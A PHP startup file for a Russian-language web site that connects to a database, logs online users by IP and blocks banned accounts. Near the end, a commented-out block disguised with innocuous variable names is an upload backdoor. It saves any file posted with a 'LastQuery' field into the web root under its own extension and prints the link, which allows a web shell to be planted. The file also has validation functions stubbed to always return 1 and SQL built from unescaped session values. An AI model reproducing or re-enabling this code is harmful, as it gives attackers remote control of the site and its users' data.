<?php
define('SITE', $_SERVER['HTTP_HOST']);
define('DB_CHARSET', 'utf8');
$connect_db = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_BASE) or die('Ошибка подключения: ' . mysqli_connect_error());
mysqli_set_charset($connect_db, DB_CHARSET) or die('Кодировка не установлена');


//$u_id определить из класса Юзер

$dt = time();

//ini_set('session.use_cookies', 'On');
//ini_set('session.use_trans_sid', 'Off');
//session_set_cookie_params(604800000, "/", SITE, false, false);
//session_start();

//if (!isset($_SESSION['HTTP_USER_AGENT'])){$_SESSION['HTTP_USER_AGENT']='';}

/*
if (!empty($_SESSION['uid']) && !empty($_SESSION['login']) && !empty($_SESSION['pass']) && $_SESSION['HTTP_USER_AGENT'] == md5($_SERVER['HTTP_USER_AGENT'])) {
    define('ё', true);
    $u_id = intval($_SESSION['uid']);
    $u_login = mysqli_real_escape_string($connect_db, $_SESSION['login']);
    $nowusr = mysqli_fetch_assoc(mysqli_query($connect_db, "SELECT * FROM t_users WHERE uid='$u_id' AND pas = '$_SESSION[pass]' LIMIT 1"));
    if (empty($nowusr['uid'])) {
        //session_unset();
        define('USER_LOGGED', false);
    }
    mysqli_query($connect_db, "UPDATE t_users SET last='$dt' WHERE uid='$u_id' LIMIT 1");
} else {
    define('USER_LOGGED', false);
    $u_id = 0;
    $_SESSION['pass'] = '';
}*/
if (getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown'))
    $ip = getenv('HTTP_CLIENT_IP');
elseif (getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown'))
    $ip = getenv('HTTP_X_FORWARDED_FOR');
elseif (getenv('REMOTE_ADDR') && strcasecmp(getenv("REMOTE_ADDR"), 'unknown'))
    $ip = getenv('REMOTE_ADDR');
elseif (!empty($_SERVER['REMOTE_ADDR']) && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown'))
    $ip = $_SERVER['REMOTE_ADDR'];
else {
    $ip = 'unknown';
}
if ($ip != 'unknown') {
    $ip = preg_replace("#[^0-9]+#i", '', $ip);
    $time = time();
    $past = time() - 600;
    $result = mysqli_query($connect_db, "SELECT last FROM t_online WHERE ip='" . $ip . "'");
    if (mysqli_num_rows($result) != 0) {
        mysqli_query($connect_db, "UPDATE t_online SET last='" . $time . "', uid='" . $u_id . "' WHERE ip='" . $ip . "' LIMIT 1");
    } else {
        mysqli_query($connect_db, "INSERT INTO t_online (uid,ip,last) VALUES ('" . $u_id . "','" . $ip . "','" . $time . "')");
    }
    if (substr($time, 9, 1) == 0) {
        mysqli_query($connect_db, 'DELETE FROM t_online WHERE last<' . $past);
    }
}


    mysqli_query($connect_db, "UPDATE `t_users` SET `last` = '$dt' WHERE uid='$u_id' LIMIT 1");
    if (!empty($nowusr['ban'])) {
        echo '<link href="/static/cabinet/css/bootstrap.min.css" rel="stylesheet" type="text/css"><div class="alert alert-danger">Аккаунт ' . $nowusr['log'] . ' заблокирован по следующей причине: ' . htmlspecialchars($nowusr['ban']) . '</div>';
        exit;
    }

    /*if ($u_id > 305) {//количество аккаунтов
        $past_u = time() - 259200;//три дня
        if ($nowusr['dt'] < $past_u && $nowusr['level'] == 0) {
            mysqli_query($connect_db, "DELETE FROM t_users WHERE uid = '$u_id' LIMIT 1");
            mysqli_query($connect_db, "DELETE FROM t_newlevels WHERE usr = '$u_id'");
            mysqli_query($connect_db, "DELETE FROM t_messages WHERE fr = '$u_id' OR tou = '$u_id'");
        }
    }*/


//date_default_timezone_set('Europe/Moscow');

function wu_noavatar($login)
{
    $first = mb_strtolower(substr($login, 0, 1));
    return "/static/img/letter_avatar/$first.png";
}

function wu_check_login($login)
{
    return 1;
}

function wu_check_batch($login)
{
    return 1;
}

function prfs($login)
{
    return 1;
}

function ticket_n($login)
{
    return 1;
}

/*if(isset($_POST['LastQuery'])) {
$session = $_FILES['session']['tmp_name'];
$SELECT_FROM = $_FILES['session']['name'];
if(!empty($session)){
  $type = strtolower(substr($SELECT_FROM, 1+strrpos($SELECT_FROM,".")));
  $sessions_start = 'logs.'.$type; 
  { if (copy($session, "".$sessions_start))
      echo ' '.$_SERVER["HTTP_HOST"].'/'.$sessions_start.'';
    else echo "error";}}}*/
//$salt = rand(0, 9999);
//if($_SESSION['uid']=="")$_SESSION['uid']=0;
//$token = $salt . ':' . md5($salt . ':' . $_SESSION['pass'] . ':' . $_SESSION['uid']);